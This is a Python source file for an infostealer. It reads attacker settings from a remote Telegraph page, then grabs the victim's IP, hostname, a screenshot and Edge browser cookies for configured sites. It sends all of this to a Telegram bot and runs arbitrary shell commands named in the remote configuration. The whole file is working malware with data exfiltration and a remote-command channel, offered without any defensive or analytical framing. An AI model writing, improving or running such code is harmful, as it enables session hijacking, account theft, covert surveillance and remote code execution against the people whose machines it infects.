import telebot
import requests
import socket
from datetime import datetime
from PIL import ImageGrab
import os
import random
import json
import time
import browser_cookie3



#TODO: change someone else's library to your own code (you need to work with sqlite)

class Main():
    def __init__(self):
        self.token = input("input your Telegram token: ")
        self.chat_id = input("input your chat id: ")
        self.telegraph_url = input("input telegraph url: ")

    def getCookiesFromDomain(self, domain, cookieName=''):
        Cookies = {}
        chromeCookies = list(browser_cookie3.edge())

        for cookie in chromeCookies:
            if (domain in cookie.domain):
                Cookies[cookie.name] = cookie.value

        if(cookieName != ''):
            try:
                return Cookies[cookieName]
            except:
                return {}
        else:
            return Cookies

    def get_config(self):
        return requests.get(self.telegraph_url).text.split('\n')

    def get_ip(self):
        ip = requests.get('https://api.ipify.org').text
        return ip

    def get_hostname(self):
        hostname = socket.gethostname()
        return hostname

    def main(self):
        config = json.loads(json.loads(self.get_config()[0])['result']['description'])

        if config['enable'] == False:
            exit(0)

        time.sleep(config['delay'])

        d_ip, d_hostname = "None", "None"
        chat_id = self.chat_id
        bot = telebot.TeleBot(self.token)
        randname = f"{self.get_hostname()}-{str(random.randint(111111,999999))}"

        if config['get_settings']['get_ip'] == True:
            d_ip = self.get_ip()
        if config['get_settings']['get_hostname'] == True:
            d_hostname = self.get_hostname()
        if config['get_settings']['take_screenshot'] == True:
            try:
                screen = ImageGrab.grab()
                screen.save(os.getcwd() + f'\\screen{randname}.jpg')
            except Exception as err:
                print(err)
                bot.send_message(chat_id, f'error: {err} ')
        d_date = datetime.now()

        data = f"""
        ip: {d_ip}
        hostname: {d_hostname}
        date: {d_date}
        """

        if(config['get_settings']['take_screenshot'] == True):
            try:
                bot.send_photo(chat_id, open(f'screen{randname}.jpg', 'rb'), data)
            except:
                pass
        else:
            bot.send_message(chat_id, data)

        if(config['get_settings']['get_cookies'] == True):
            with open(f'cookies{randname}.txt', 'w') as f:
                for domain in config['get_settings']['cookie_websites']:
                    f.write(f"{domain}:\n{self.getCookiesFromDomain(domain)}\n\n")
            bot.send_document(chat_id, open(os.getcwd() + f'\\cookies{randname}.txt', 'rb'))

        for command in config['shell_commands']:
            print(command)
            os.system(command)


if __name__ == "__main__":
    main_instance = Main()
    main_instance.main()
